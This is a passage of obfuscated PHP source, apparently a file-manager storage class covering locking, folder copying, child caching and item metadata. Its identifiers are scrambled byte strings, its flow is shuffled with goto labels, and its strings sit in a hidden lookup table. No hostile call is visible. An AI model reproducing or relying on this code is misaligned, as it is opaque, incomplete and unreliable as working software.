$CÛ®Êë©Àº); $this->_lockCheckEnd($bÊ™πœâßı[487], $aƒ§¶âÈ·ï); goto E‚≥®ò∂¡»; c≥ÂŸ‚€óÁ: $bÊ™πœâßı =& $_SERVER[¯èãÄπµ]; if (!$this->allowLock()) { return; } $this->_lockCheck($bÊ™πœâßı[487], $aƒ§¶âÈ·ï); goto d¨Œá§£ªõ; E‚≥®ò∂¡»: } public function lockWriteEnd($CÜæâ¿Â∑ë, $AØßå∂‡ºº = '') { $e®äƒûèõˆ =& $_SERVER[¯èãÄπµ]; if (!$this->allowLock()) { return; } $E•Ö’”±•Æ = 0; $this->_lockKey($e®äƒûèõˆ[491] . $CÜæâ¿Â∑ë . $e®äƒûèõˆ[91] . $AØßå∂‡ºº, $E•Ö’”±•Æ); $this->_lockEvent($CÜæâ¿Â∑ë, array($e®äƒûèõˆ[486], $e®äƒûèõˆ[488]), $E•Ö’”±•Æ); $this->_lockParent($CÜæâ¿Â∑ë, array($e®äƒûèõˆ[486], $e®äƒûèõˆ[488]), $E•Ö’”±•Æ); } public function lockMoveStart($c±¶òÑüé¿) { goto büòÑäÊ•≤; CËÒé˜±Ö∂: $CÍÇãé∫ıÙ = 1; $this->_lockKey($aô—é‰≠…–[492] . $c±¶òÑüé¿, $CÍÇãé∫ıÙ); $this->_lockEvent($c±¶òÑüé¿, array($aô—é‰≠…–[486], $aô—é‰≠…–[487]), $CÍÇãé∫ıÙ); goto fëÇ≈Çè£™; büòÑäÊ•≤: $aô—é‰≠…– =& $_SERVER[¯èãÄπµ]; if (!$this->allowLock()) { return; } $this->_lockCheck($aô—é‰≠…–[488], $c±¶òÑüé¿); goto CËÒé˜±Ö∂; fëÇ≈Çè£™: $this->_lockParent($c±¶òÑüé¿, array($aô—é‰≠…–[486], $aô—é‰≠…–[488]), $CÍÇãé∫ıÙ); $this->_lockEvent($c±¶òÑüé¿, array($aô—é‰≠…–[493], $aô—é‰≠…–[489], $aô—é‰≠…–[490]), $CÍÇãé∫ıÙ); $this->_lockCheckEnd($aô—é‰≠…–[488], $c±¶òÑüé¿); goto dËúø¿•¥Ñ; dËúø¿•¥Ñ: } public function lockMoveEnd($C“≠âÿ∏ãŸ) { goto BÁãı”óê; BÁãı”óê: $e™≤ì–¢Èâ =& $_SERVER[¯èãÄπµ]; if (!$this->allowLock()) { return; } $cÙÖ…Ë√≈â = 0; goto aÊ‹—¢Ùú‹; aÇ«¡ß¶»‡: $this->_lockEvent($C“≠âÿ∏ãŸ, array($e™≤ì–¢Èâ[493], $e™≤ì–¢Èâ[489], $e™≤ì–¢Èâ[490]), $cÙÖ…Ë√≈â); goto bñÍ√©º∑ƒ; aÊ‹—¢Ùú‹: $this->_lockKey($e™≤ì–¢Èâ[492] . $C“≠âÿ∏ãŸ, $cÙÖ…Ë√≈â); $this->_lockEvent($C“≠âÿ∏ãŸ, array($e™≤ì–¢Èâ[486], $e™≤ì–¢Èâ[487]), $cÙÖ…Ë√≈â); $this->_lockParent($C“≠âÿ∏ãŸ, array($e™≤ì–¢Èâ[486], $e™≤ì–¢Èâ[488]), $cÙÖ…Ë√≈â); goto aÇ«¡ß¶»‡; bñÍ√©º∑ƒ: } private function _lockCheck($Eÿ∞–´®®‚, $EÍÔœú¬€¡) { goto D¡¡ïà•’é; düµôê˜„¢: $aŸÌ±é„˜¥ = array_reverse($this->parentLevelArray($D§ÌÖØè¿ˆ[$EÔ°Ê©êí˜[455]])); foreach ($aŸÌ±é„˜¥ as $aπ¥©Ûä≈˘) { $AàüÃöÏÕë = $Eÿ∞–´®®‚ . $EÔ°Ê©êí˜[495] . $aπ¥©Ûä≈˘; if (CacheLock::lockGet($EÔ°Ê©êí˜[496] . $AàüÃöÏÕë)) { $D§ÌÖØè¿ˆ = $this->sourceInfo($aπ¥©Ûä≈˘); CacheLock::setErrorMsg($EÔ°Ê©êí˜[153] . htmlspecialchars($D§ÌÖØè¿ˆ[$EÔ°Ê©êí˜[28]]) . $EÔ°Ê©êí˜[472] . $A¡‡áœÌË); $this->_lockKey($AàüÃöÏÕë, 1); $this->_lockKey($AàüÃöÏÕë, 0); } } goto d£è€ß‹Èü; D¡¡ïà•’é: $EÔ°Ê©êí˜ =& $_SERVER[¯èãÄπµ]; $D§ÌÖØè¿ˆ = $this->sourceInfo($EÍÔœú¬€¡); $AàüÃöÏÕë = $Eÿ∞–´®®‚ . $EÔ°Ê©êí˜[91] . $EÍÔœú¬€¡; goto eØÕ±®˜éç; eüµººûìß: CacheLock::setErrorMsg($EÔ°Ê©êí˜[153] . htmlspecialchars($D§ÌÖØè¿ˆ[$EÔ°Ê©êí˜[28]]) . $EÔ°Ê©êí˜[472] . $A¡‡áœÌË); $this->_lockKey($AàüÃöÏÕë, 1); $this->_lockKey($AàüÃöÏÕë, 0); goto düµôê˜„¢; eØÕ±®˜éç: $this->_lockTimeStart[$AàüÃöÏÕë] = timeFloat(); if (!is_array($D§ÌÖØè¿ˆ)) { return; } $A¡‡áœÌË = LNG($EÔ°Ê©êí˜[494]); goto eüµººûìß; d£è€ß‹Èü: } private function _lockCheckEnd($D»µ÷£«‘Ô, $C—äàÁçˆ”) { goto CëøŒâëö«; Fïò◊©∏˘É: if ($aÕ¢‚π«Â„ > 0.5) { unset(self::$cacheSourceInfo[$Eä≠ƒ‘îÈ…[406] . $C—äàÁçˆ”]); } $céœ¥ ºàÍ = $this->sourceInfo($C—äàÁçˆ”); if (!$céœ¥ ºàÍ) { show_json(LNG($Eä≠ƒ‘îÈ…[100]), !1); } goto b±™ÏÕ«ËÚ; e∞áÇúê·±: if (!isset($this->_lockTimeStart[$dáŸŸ°àÇ‰])) { return; } $aÕ¢‚π«Â„ = timeFloat() - $this->_lockTimeStart[$dáŸŸ°àÇ‰]; unset($this->_lockTimeStart[$dáŸŸ°àÇ‰]); goto Fïò◊©∏˘É; CëøŒâëö«: $Eä≠ƒ‘îÈ… =& $_SERVER[¯èãÄπµ]; $dáŸŸ°àÇ‰ = $D»µ÷£«‘Ô . $Eä≠ƒ‘îÈ…[91] . $C—äàÁçˆ”; CacheLock::setErrorMsg($Eä≠ƒ‘îÈ…[357]); goto e∞áÇúê·±; b±™ÏÕ«ËÚ: } private function _lockParent($Eêâ∑á©∑ä, $dÖÚ¨ΩÇÊé, $d∆Ì”∂øçö) { if (!$this->autoLockSet) { return; } $eﬁâãûç·„ = $this->sourceInfo($Eêâ∑á©∑ä); if (!is_array($eﬁâãûç·„)) { return; } $c°±êœÍÀ  = array_reverse($this->parentLevelArray($eﬁâãûç·„[$_SERVER[¯èãÄπµ][455]])); foreach ($c°±êœÍÀ  as $DäÉë¿éë≤) { $this->_lockEvent($DäÉë¿éë≤, $dÖÚ¨ΩÇÊé, $d∆Ì”∂øçö); } } private function _lockEvent($bÁ¶ñËãå’, $bÌÉúª§≠ì, $BÜæÒÌ∆Á≥) { $bò›Ω˜£∏ä =& $_SERVER[¯èãÄπµ]; if (!$this->autoLockSet) { return; } foreach ($bÌÉúª§≠ì as $Dè·ùüãè¢) { $f©±ˆ‰Æ∑ë = $Dè·ùüãè¢ . $bò›Ω˜£∏ä[91] . $bÁ¶ñËãå’; if ($BÜæÒÌ∆Á≥ && CacheLock::lockGet($bò›Ω˜£∏ä[496] . $f©±ˆ‰Æ∑ë)) { continue; } $this->_lockKey($f©±ˆ‰Æ∑ë, $BÜæÒÌ∆Á≥); } } public $_lockTimeStart = array(); public $_lockTime = 5; private static $_lockItemArr = array(); private function _lockKey($bº·≤üì÷ , $fêæ·«™Æ∆ = 1) { $DÏÛ≈õ¬÷‰ = $_SERVER[¯èãÄπµ][496] . md5($bº·≤üì÷ ); if ($fêæ·«™Æ∆) { if (isset(self::$_lockItemArr[$DÏÛ≈õ¬÷‰])) { return; } self::$_lockItemArr[$DÏÛ≈õ¬÷‰] = 1; CacheLock::lock($DÏÛ≈õ¬÷‰, $this->_lockTime); } else { if (!isset(self::$_lockItemArr[$DÏÛ≈õ¬÷‰])) { return; } unset(self::$_lockItemArr[$DÏÛ≈õ¬÷‰]); CacheLock::unlock($DÏÛ≈õ¬÷‰); } } public function isParentOf($Bƒ«¬§™°¯, $Bõøõåﬂ¨ö) { goto F≈ëª‚ùå™; Eº‰‰ö∑ƒä: $f›äò‹«Ó® = $eëìå…ü¥Ë[$A∫õÌêπñ•[455]] . $eëìå…ü¥Ë[$A∫õÌêπñ•[365]] . $A∫õÌêπñ•[47]; $c‹Á®…–µƒ = $D˜“ÎîîÖ“[$A∫õÌêπñ•[455]] . $D˜“ÎîîÖ“[$A∫õÌêπñ•[365]] . $A∫õÌêπñ•[47]; $EÀÍúç∆âÑ = strpos($c‹Á®…–µƒ, $f›äò‹«Ó®) === 0; goto A∆¢«€⁄ƒ›; A∆¢«€⁄ƒ›: return $EÀÍúç∆âÑ; goto a¬æ†Ë§ãã; F≈ëª‚ùå™: $A∫õÌêπñ• =& $_SERVER[¯èãÄπµ]; $eëìå…ü¥Ë = $this->sourceInfo($Bƒ«¬§™°¯); $D˜“ÎîîÖ“ = $this->sourceInfo($Bõøõåﬂ¨ö); goto Eº‰‰ö∑ƒä; a¬æ†Ë§ãã: } private $targetIsDelete = 0; public function copy($fØ¢µÙÃéÀ, $A£◊Ûˆª«¶, $FÒÛõì£‡å = REPEAT_REPLACE, $b°’ÊûÕÜ∞ = '') { goto EÔò‰ÃÃ’Í; câ§ÛÍÈ´ñ: $this->updateModifyTime($A£◊Ûˆª«¶); return $dÛ’–íØ®„; goto Fﬁî˜Ô è˘; AÃ˜âÏÒäÎ: $this->targetIsDelete = intval($C∑ì´îƒ§Ô[$eóçüõùé„[393]]); $f¥›Õ†œ§ = $this->fileNameExistCache($A£◊Ûˆª«¶, $C∑ì´îƒ§Ô[$eóçüõùé„[28]]); $dÛ’–íØ®„ = $this->_copy($fØ¢µÙÃéÀ, $A£◊Ûˆª«¶, $FÒÛõì£‡å, $DÙèΩåÔ÷ù, !0, $b°’ÊûÕÜ∞); goto bÒ§ôÜÒ°Ç; DôåÚ»Ëºã: if (!$C∑ì´îƒ§Ô || !$Eì∑¶ú¨áÜ || $Eì∑¶ú¨áÜ[$eóçüõùé„[366]] != $eóçüõùé„[83]) { return !1; } if ($this->isParentOf($fØ¢µÙÃéÀ, $A£◊Ûˆª«¶)) { return !1; } $FëÊ√úÜç≥ = $b°’ÊûÕÜ∞ ? $b°’ÊûÕÜ∞ : $C∑ì´îƒ§Ô[$eóçüõùé„[28]]; goto A˜¯ö«ÆüÊ; bˆÍ°·ó∫˘: $this->saveAll($DÙèΩåÔ÷ù[$eóçüõùé„[499]]); Model($eóçüõùé„[163])->linkAdd($DÙèΩåÔ÷ù[$eóçüõùé„[497]]); $this->folderSizeReset($A£◊Ûˆª«¶); goto câ§ÛÍÈ´ñ; bÒ§ôÜÒ°Ç: $this->_childrenListClear(); $this->lockCopyEnd($fØ¢µÙÃéÀ); $this->lockWriteEnd($A£◊Ûˆª«¶, $FëÊ√úÜç≥); goto e◊âêı„Ø√; EÔò‰ÃÃ’Í: $eóçüõùé„ =& $_SERVER[¯èãÄπµ]; $C∑ì´îƒ§Ô = $this->sourceInfo($fØ¢µÙÃéÀ); $Eì∑¶ú¨áÜ = $this->sourceInfo($A£◊Ûˆª«¶); goto DôåÚ»Ëºã; A˜¯ö«ÆüÊ: $this->lockCopyStart($fØ¢µÙÃéÀ); $this->lockWriteStart($A£◊Ûˆª«¶, $FëÊ√úÜç≥); $DÙèΩåÔ÷ù = array($eóçüõùé„[497] => array(), $eóçüõùé„[498] => array(), $eóçüõùé„[499] => array()); goto AÃ˜âÏÒäÎ; e◊âêı„Ø√: if ($C∑ì´îƒ§Ô[$eóçüõùé„[366]] == $eóçüõùé„[83] && $f¥›Õ†œ§ == $dÛ’–íØ®„) { $this->folderSizeResetChildren($f¥›Õ†œ§); } Model($eóçüõùé„[500])->addAll($DÙèΩåÔ÷ù[$eóçüõùé„[498]], array(), !0); if ($f¥›Õ†œ§ != $dÛ’–íØ®„ || $C∑ì´îƒ§Ô[$eóçüõùé„[366]] == $eóçüõùé„[83]) { Model($eóçüõùé„[501])->eventCopy($dÛ’–íØ®„); } goto bˆÍ°·ó∫˘; Fﬁî˜Ô è˘: } private function _copy($cå‚îÏ¯„õ, $EÚìÆ÷ﬂ∏ö, $FãœÍﬂë††, &$eâ¯Ùç◊≈ﬁ, $Dª≤±„ùΩ…, $cû »∆—Á± = '') { goto CóÇ–ÑŒè¬; dé∑†åÒä≤: if (!$Fâ°√ªåîÓ) { return $this->_copyCreate($cå‚îÏ¯„õ, $EÚìÆ÷ﬂ∏ö, $fÜëß√ê‡‚, $eâ¯Ùç◊≈ﬁ); } $E∆Ñ∑≠ö  = $Fâ°√ªåîÓ; if ($b›œÓ•‰±Ç) { if ($FãœÍﬂë†† == REPEAT_RENAME_FOLDER) { $fÜëß√ê‡‚ = $this->fileNameAutoCache($EÚìÆ÷ﬂ∏ö, $fÜëß√ê‡‚, $FãœÍﬂë††, $b›œÓ•‰±Ç); $E∆Ñ∑≠ö  = $this->_copyCreate($cå‚îÏ¯„õ, $EÚìÆ÷ﬂ∏ö, $fÜëß√ê‡‚, $eâ¯Ùç◊≈ﬁ); } else { $eÁ–º°•ƒ• = $this->_childrenList($cå‚îÏ¯„õ); foreach ($eÁ–º°•ƒ• as $eÿ™¬Ω÷ë¿) { $this->_copy($eÿ™¬Ω÷ë¿[$E…∆™ò£ãã[365]], $Fâ°√ªåîÓ, $FãœÍﬂë††, $eâ¯Ùç◊≈ﬁ, !1); } } } else { if ($FãœÍﬂë†† == REPEAT_RENAME || $FãœÍﬂë†† == REPEAT_RENAME_FOLDER) { $fÜëß√ê‡‚ = $this->fileNameAutoCache($EÚìÆ÷ﬂ∏ö, $fÜëß√ê‡‚, $FãœÍﬂë††, $b›œÓ•‰±Ç); $E∆Ñ∑≠ö  = $this->_copyCreate($cå‚îÏ¯„õ, $EÚìÆ÷ﬂ∏ö, $fÜëß√ê‡‚, $eâ¯Ùç◊≈ﬁ); } else { if ($FãœÍﬂë†† == REPEAT_REPLACE) { $CÙäÇÒ¢≠Ω = $this->sourceInfoCache($Fâ°√ªåîÓ); $FØ∑úÉ‰√¯ = $this->fileHistory($CÙäÇÒ¢≠Ω, $AÇ®‚œ≈‹«[$E…∆™ò£ãã[415]], $AÇ®‚œ≈‹«[$E…∆™ò£ãã[77]]); if ($FØ∑úÉ‰√¯) { $eâ¯Ùç◊≈ﬁ[$E…∆™ò£ãã[497]][] = $AÇ®‚œ≈‹«[$E…∆™ò£ãã[415]]; } } else { if ($FãœÍﬂë†† == REPEAT_SKIP) { } } } Hook::trigger($E…∆™ò£ãã[502], array($E…∆™ò£ãã[503], $AÇ®‚œ≈‹«, 0)); } goto F„¨€â«›Ó; DØËÔî¥©‹: $fÜëß√ê‡‚ = $cû »∆—Á± ? $cû »∆—Á± : $AÇ®‚œ≈‹«[$E…∆™ò£ãã[28]]; $Fâ°√ªåîÓ = $this->fileNameExistCache($EÚìÆ÷ﬂ∏ö, $fÜëß√ê‡‚); if ($Dª≤±„ùΩ…) { $this->_childrenAllMake($cå‚îÏ¯„õ); if ($b›œÓ•‰±Ç && $Fâ°√ªåîÓ) { $this->_childrenAllMake($Fâ°√ªåîÓ); } } goto dé∑†åÒä≤; F„¨€â«›Ó: return $E∆Ñ∑≠ö ; goto dÒ∂“Ò‰Áä; CóÇ–ÑŒè¬: $E…∆™ò£ãã =& $_SERVER[¯èãÄπµ]; $AÇ®‚œ≈‹« = $this->sourceInfoCache($cå‚îÏ¯„õ); $b›œÓ•‰±Ç = $AÇ®‚œ≈‹«[$E…∆™ò£ãã[366]] == $E…∆™ò£ãã[83]; goto DØËÔî¥©‹; dÒ∂“Ò‰Áä: } private function _copyCreate($AíØ®Ü––„, $c†©ƒÎÈ∫Û, $E˘‹´îæÑ¡, &$C∂¿¢ÖıÀÎ) { goto a¿¿‚Û‰•Ù; C≈¯Âíí—‘: $d∞Ñã´î´˜ = $this->_makeItemData($aÁ–Æ∏»«ê, $DêÆ„Á√ó”, $E˘‹´îæÑ¡); Hook::trigger($D∞‹≤µÙÉ¨[504], $d∞Ñã´î´˜); Hook::trigger($D∞‹≤µÙÉ¨[505], array($D∞‹≤µÙÉ¨[506], $d∞Ñã´î´˜, 0)); goto AŒò¯ﬁ±‹ì; Få≤éîﬂ¥¨: $this->_childrenListAll($AíØ®Ü––„, $fóîÔÃÑ°‰); $eãÁ÷ÊâÜƒ = count($fóîÔÃÑ°‰); if ($eãÁ÷ÊâÜƒ == 0) { return $eøäª∆ﬁÜ√; } goto d˘ÃßÆƒñ§; fª⁄è£Çäπ: if ($aÁ–Æ∏»«ê[$D∞‹≤µÙÉ¨[366]] != $D∞‹≤µÙÉ¨[83]) { $C∂¿¢ÖıÀÎ[$D∞‹≤µÙÉ¨[497]][] = $aÁ–Æ∏»«ê[$D∞‹≤µÙÉ¨[415]]; return $eøäª∆ﬁÜ√; } $fóîÔÃÑ°‰ = array(); $C∑ó°É…“ﬂ = array(); goto Få≤éîﬂ¥¨; dÿÔÈÈÕÉ: $this->addAll($C∑ó°É…“ﬂ, array(), !1); $E¶–êá“¯‚ = $this->where(array($D∞‹≤µÙÉ¨[457] => $eøäª∆ﬁÜ√))->select(); $A∞€„∏ﬁ®« = $this->_childrenMakeRelation($fóîÔÃÑ°‰, $E¶–êá“¯‚); goto EÇÕ∑° ñ£; EÇÕ∑° ñ£: $A∞€„∏ﬁ®«[$AíØ®Ü––„] = $eøäª∆ﬁÜ√; $F®‹Ñí¥ûÏ = array(); $B ¨ÆöÇÿ– = array(); goto aó¡è∏ù‡™; aó¡è∏ù‡™: foreach ($E¶–êá“¯‚ as $b≤◊õ≈–ù∏) { $Eû∆Ïß´ÆÁ = $b≤◊õ≈–ù∏[$D∞‹≤µÙÉ¨[365]]; $CïıÛ±ÑπÛ = $this->_childrenMatch($A∞€„∏ﬁ®«, $b≤◊õ≈–ù∏, $Aåä§π‘º¢); $F®‹Ñí¥ûÏ[] = array($D∞‹≤µÙÉ¨[365], $Eû∆Ïß´ÆÁ, $D∞‹≤µÙÉ¨[457], $CïıÛ±ÑπÛ[$D∞‹≤µÙÉ¨[457]]); $B ¨ÆöÇÿ–[] = array($D∞‹≤µÙÉ¨[365], $Eû∆Ïß´ÆÁ, $D∞‹≤µÙÉ¨[455], $CïıÛ±ÑπÛ[$D∞‹≤µÙÉ¨[455]]); $this->_copyApplyMeta($b≤◊õ≈–ù∏, $C∂¿¢ÖıÀÎ); if ($b≤◊õ≈–ù∏[$D∞‹≤µÙÉ¨[366]] != $D∞‹≤µÙÉ¨[83]) { $C∂¿¢ÖıÀÎ[$D∞‹≤µÙÉ¨[497]][] = $b≤◊õ≈–ù∏[$D∞‹≤µÙÉ¨[415]]; } } $this->chunkEventSet($D∞‹≤µÙÉ¨[509], array($D∞‹≤µÙÉ¨[510], $d∞Ñã´î´˜, $eãÁ÷ÊâÜƒ)); $this->saveAll($F®‹Ñí¥ûÏ); goto a∑®çÈª´ê; a∑®çÈª´ê: $this->chunkEventSet($D∞‹≤µÙÉ¨[511], array($D∞‹≤µÙÉ¨[512], $d∞Ñã´î´˜, $eãÁ÷ÊâÜƒ)); $this->saveAll($B ¨ÆöÇÿ–); return $eøäª∆ﬁÜ√; goto eäØ™™‡àó; a¿¿‚Û‰•Ù: $D∞‹≤µÙÉ¨ =& $_SERVER[¯èãÄπµ]; $aÁ–Æ∏»«ê = $this->sourceInfoCache($AíØ®Ü––„); $DêÆ„Á√ó” = $this->sourceInfoCache($c†©ƒÎÈ∫Û); goto C≈¯Âíí—‘; AŒò¯ﬁ±‹ì: $eøäª∆ﬁÜ√ = $this->add($d∞Ñã´î´˜); $BÂ¶ÌÏ≈“Ë = array($D∞‹≤µÙÉ¨[365] => $eøäª∆ﬁÜ√, $D∞‹≤µÙÉ¨[28] => $E˘‹´îæÑ¡); $this->_copyApplyMeta($BÂ¶ÌÏ≈“Ë, $C∂¿¢ÖıÀÎ); goto fª⁄è£Çäπ; d˘ÃßÆƒñ§: $Aåä§π‘º¢ = $this->sourceInfo($eøäª∆ﬁÜ√); foreach ($fóîÔÃÑ°‰ as $b≤◊õ≈–ù∏) { $Céô“ﬁ„Â˜ = $this->_makeItemData($b≤◊õ≈–ù∏, $Aåä§π‘º¢, $b≤◊õ≈–ù∏[$D∞‹≤µÙÉ¨[28]]); $Céô“ﬁ„Â˜[$D∞‹≤µÙÉ¨[455]] = $b≤◊õ≈–ù∏[$D∞‹≤µÙÉ¨[455]]; $C∑ó°É…“ﬂ[] = $Céô“ﬁ„Â˜; } $this->chunkEventSet($D∞‹≤µÙÉ¨[507], array($D∞‹≤µÙÉ¨[508], $d∞Ñã´î´˜, $eãÁ÷ÊâÜƒ)); goto dÿÔÈÈÕÉ; eäØ™™‡àó: } private function _childrenMakeRelation($Fÿ…ÀëŸÃ‡, $AÜïæ⁄«ı˜) { $eá†∏£çæ =& $_SERVER[¯èãÄπµ]; $cíØ›é ËÁ = array(); $d≤Ú‹≥Öâî = array(); foreach ($Fÿ…ÀëŸÃ‡ as $CÔ˜÷¥›¨ì) { $aÙ®ã£œùÙ = $CÔ˜÷¥›¨ì[$eá†∏£çæ[28]] . $eá†∏£çæ[8] . $CÔ˜÷¥›¨ì[$eá†∏£çæ[455]]; $cíØ›é ËÁ[$aÙ®ã£œùÙ] = $CÔ˜÷¥›¨ì[$eá†∏£çæ[365]]; } foreach ($AÜïæ⁄«ı˜ as $CÔ˜÷¥›¨ì) { $aÙ®ã£œùÙ = $CÔ˜÷¥›¨ì[$eá†∏£çæ[28]] . $eá†∏£çæ[8] . $CÔ˜÷¥›¨ì[$eá†∏£çæ[455]]; $aøûøéãâç = $cíØ›é ËÁ[$aÙ®ã£œùÙ]; $d≤Ú‹≥Öâî[$aøûøéãâç] = $CÔ˜÷¥›¨ì[$eá†∏£çæ[365]]; } return $d≤Ú‹≥Öâî; } private function _childrenMatch($aß¥Ç‹ã∏≥, $B‰ƒ§∆Õ∑à, $aâøﬁˆ¨∂) { goto b¿ó∞˘ΩÙ¢; A´∞ÒÚÒ“Ú: foreach ($Eçë®…¬Û® as $Aò®ºõ•Üé) { if (isset($aß¥Ç‹ã∏≥[$Aò®ºõ•Üé])) { $F»õ‡†ﬁº .= $aß¥Ç‹ã∏≥[$Aò®ºõ•Üé] . $f£û∑«ÓŒè[513]; } } $F»õ‡†ﬁº = rtrim($F»õ‡†ﬁº, $f£û∑«ÓŒè[47]) . $f£û∑«ÓŒè[47]; $C◊Ëﬂä√∏â = $this->parentLevelArray($F»õ‡†ﬁº); goto DÕåí‰◊üƒ; b¿ó∞˘ΩÙ¢: $f£û∑«ÓŒè =& $_SERVER[¯èãÄπµ]; $F»õ‡†ﬁº = $aâøﬁˆ¨∂[$f£û∑«ÓŒè[455]]; $Eçë®…¬Û® = $this->parentLevelArray($B‰ƒ§∆Õ∑à[$f£û∑«ÓŒè[455]]); goto A´∞ÒÚÒ“Ú; DÕåí‰◊üƒ: $CË∞ΩÒÚ°ñ = $C◊Ëﬂä√∏â[count($C◊Ëﬂä√∏â) - 1]; return array($f£û∑«ÓŒè[457] => $CË∞ΩÒÚ°ñ, $f£û∑«ÓŒè[455] => $F»õ‡†ﬁº); goto cóÛËÕ”Ó¶; cóÛËÕ”Ó¶: } private function _makeItemData($bÔàª∂à¨Ù, $DΩ ê¥»Üœ, $FäöòŸ–ìÚ) { $FìÌÖÚàˆÈ =& $_SERVER[¯èãÄπµ]; $aÑÁåç™ï‡ = array($FìÌÖÚàˆÈ[514] => $bÔàª∂à¨Ù[$FìÌÖÚàˆÈ[366]], $FìÌÖÚàˆÈ[382] => $FäöòŸ–ìÚ, $FìÌÖÚàˆÈ[515] => $bÔàª∂à¨Ù[$FìÌÖÚàˆÈ[368]], $FìÌÖÚàˆÈ[416] => $bÔàª∂à¨Ù[$FìÌÖÚàˆÈ[415]], $FìÌÖÚàˆÈ[516] => $bÔàª∂à¨Ù[$FìÌÖÚàˆÈ[77]], $FìÌÖÚàˆÈ[517] => $DΩ ê¥»Üœ[$FìÌÖÚàˆÈ[367]], $FìÌÖÚàˆÈ[518] => $DΩ ê¥»Üœ[$FìÌÖÚàˆÈ[452]], $FìÌÖÚàˆÈ[519] => USER_ID, $FìÌÖÚàˆÈ[520] => USER_ID, $FìÌÖÚàˆÈ[364] => $DΩ ê¥»Üœ[$FìÌÖÚàˆÈ[365]], $FìÌÖÚàˆÈ[521] => $DΩ ê¥»Üœ[$FìÌÖÚàˆÈ[455]] . $DΩ ê¥»Üœ[$FìÌÖÚàˆÈ[365]] . $FìÌÖÚàˆÈ[47], $FìÌÖÚàˆÈ[392] => 0, $FìÌÖÚàˆÈ[522] => $FìÌÖÚàˆÈ[33]); return $aÑÁåç™ï‡; } private function _copyApplyMeta($dÂıµÔÆ·∂, &$c‚≈˜ÏØ™‘) { $c¢ı†ÖéØÛ =& $_SERVER[¯èãÄπµ]; $cº–Ô¿≥Îˆ = $dÂıµÔÆ·∂[$c¢ı†ÖéØÛ[365]]; $B»‚ì§Ê≤ê = $dÂıµÔÆ·∂[$c¢ı†ÖéØÛ[28]]; if (!isset($dÂıµÔÆ·∂[$c¢ı†ÖéØÛ[523]]) || !$dÂıµÔÆ·∂[$c¢ı†ÖéØÛ[523]] || $dÂıµÔÆ·∂[$c¢ı†ÖéØÛ[523]] == $c¢ı†ÖéØÛ[464]) { $c‚≈˜ÏØ™‘[$c¢ı†ÖéØÛ[499]][] = array($c¢ı†ÖéØÛ[365], $cº–Ô¿≥Îˆ, $c¢ı†ÖéØÛ[523], short_id($cº–Ô¿≥Îˆ)); } if (Input::check($B»‚ì§Ê≤ê, $c¢ı†ÖéØÛ[524])) { $c‚≈˜ÏØ™‘[$c¢ı†ÖéØÛ[498]][] = array($c¢ı†ÖéØÛ[365] => $cº–Ô¿≥Îˆ, $c¢ı†ÖéØÛ[89] => $c¢ı†ÖéØÛ[412], $c¢ı†ÖéØÛ[355] => str_replace($c¢ı†ÖéØÛ[50], $c¢ı†ÖéØÛ[33], Pinyin::encode($B»‚ì§Ê≤ê))); $c‚≈˜ÏØ™‘[$c¢ı†ÖéØÛ[498]][] = array($c¢ı†ÖéØÛ[365] => $cº–Ô¿≥Îˆ, $c¢ı†ÖéØÛ[89] => $c¢ı†ÖéØÛ[411], $c¢ı†ÖéØÛ[355] => Pinyin::encode($B»‚ì§Ê≤ê, $c¢ı†ÖéØÛ[525])); } } private $_childrenListCache = array(); private $_childrenItemCache = array(); private function _childrenAllMake($c∑ø Ê∑°∞) { goto eÏ≈‹á∑Éª; eÏ≈‹á∑Éª: $c’‡£‘à§› =& $_SERVER[¯èãÄπµ]; $D÷◊úú»é© = $this->sourceInfo($c∑ø Ê∑°∞); $FÈ£„∏¢í∆ = $c’‡£‘à§›[526]; goto d∆°∂«∂éË; d∆°∂«∂éË: $eâ„ú„ãÀê = array($c’‡£‘à§›[455] => array($c’‡£‘à§›[479], $D÷◊úú»é©[$c’‡£‘à§›[455]] . $c∑ø Ê∑°∞ . $c’‡£‘à§›[480]), $c’‡£‘à§›[393] => $this->targetIsDelete); $Eó—∂ÉôñÆ = $this->field($FÈ£„∏¢í∆)->where($eâ„ú„ãÀê)->select(); if (!$Eó—∂ÉôñÆ) { return; } goto DÔÀö—ë‰â; DÔÀö—ë‰â: $Eó—∂ÉôñÆ = array_to_keyvalue($Eó—∂ÉôñÆ, $c’‡£‘à§›[365]); foreach ($Eó—∂ÉôñÆ as $EíñÉÎÒÈı) { $a≥óÌù≠å¥ = $EíñÉÎÒÈı[$c’‡£‘à§›[457]]; $c∑ø Ê∑°∞ = $EíñÉÎÒÈı[$c’‡£‘à§›[365]]; if (!isset($this->_childrenListCache[$c∑ø Ê∑°∞]) && $EíñÉÎÒÈı[$c’‡£‘à§›[366]] == $c’‡£‘à§›[83]) { $this->_childrenListCache[$c∑ø Ê∑°∞] = array(); } if (!isset($this->_childrenListCache[$a≥óÌù≠å¥])) { $this->_childrenListCache[$a≥óÌù≠å¥] = array(); } $this->_childrenListCache[$a≥óÌù≠å¥][$c∑ø Ê∑°∞] = $EíñÉÎÒÈı; $this->_childrenItemCache[$c∑ø Ê∑°∞] = $EíñÉÎÒÈı; } goto fßá…ÕâÜ…; fßá…ÕâÜ…: } private function _childrenListAll($cäê±ïÂ—ö, &$fåõéä¿¨µ) { $E”ò∆äˆ¿ﬂ =& $_SERVER[¯èãÄπµ]; if (!isset($this->_childrenListCache[$cäê±ïÂ—ö])) { return; } $Dìƒ›âÌ¶Ù = $this->_childrenListCache[$cäê±ïÂ—ö]; foreach ($Dìƒ›âÌ¶Ù as $BøÍ∫Üâç‰ => $D¢ˆã÷Îá›) { $fåõéä¿¨µ[$BøÍ∫Üâç‰] = $D¢ˆã÷Îá›; if ($D¢ˆã÷Îá›[$E”ò∆äˆ¿ﬂ[366]] == $E”ò∆äˆ¿ﬂ[83]) { $this->_childrenListAll($BøÍ∫Üâç‰, $fåõéä¿¨µ); } } } private function sourceInfoCache($fòêÏ¨…≥ÿ) { if (isset($this->_childrenItemCache[$fòêÏ¨…≥ÿ])) { return $this->_childrenItemCache[$fòêÏ¨…≥ÿ]; } return $this->sourceInfo($fòêÏ¨…≥ÿ); } private function _childrenList($EîÖ›ÿÖ¡…) { if (isset($this->_childrenListCache[$EîÖ›ÿÖ¡…])) { return $this->_childrenListCache[$EîÖ›ÿÖ¡…]; } return $this->_childrenListSelect($EîÖ›ÿÖ¡…); } private function _childrenListSelect($eë‹‚˜ê‹¥) { goto a°ëùàé¢¢; a°ëùàé¢¢: $E‘ü∏ÛÁ§Ó =& $_SERVER[¯èãÄπµ]; $d£É¨ó¯ÑÏ = 